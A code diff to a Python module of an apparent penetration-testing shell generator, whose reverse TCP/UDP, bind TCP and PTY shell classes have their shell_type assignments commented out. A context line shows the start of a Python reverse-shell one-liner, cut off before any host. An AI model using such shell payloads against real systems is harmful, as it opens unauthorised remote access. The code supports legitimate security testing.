@@ -34,7 +34,7 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
         self.protocol = "tcp"
-        self.shell_type = 1
+        # self.shell_type = 1
 
     def make_shell(self):
         self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
@@ -68,7 +68,7 @@ class PTY(plugin.BaseShell):
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
         )
-        self.shell_type = 0
+        # self.shell_type = 0
         self.is_interactive = True
         self.opts.description = "[PTYShell] Python PTY shell escape from https://netsec.ws/?p=337"
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
@@ -81,7 +81,7 @@ class ReverseUDP(ReverseTCP):
     def __init__(self):
         super().__init__()
         self.protocol = "udp"
-        self.shell_type = 1
+        # self.shell_type = 1
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
 
 
@@ -118,7 +118,7 @@ class BindTCP(plugin.BindShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
         self.set_write_file()
         self.protocol = "tcp"
-        self.shell_type = 2
+        # self.shell_type = 2
         self.is_interactive = True
 
     def make_shell(self):
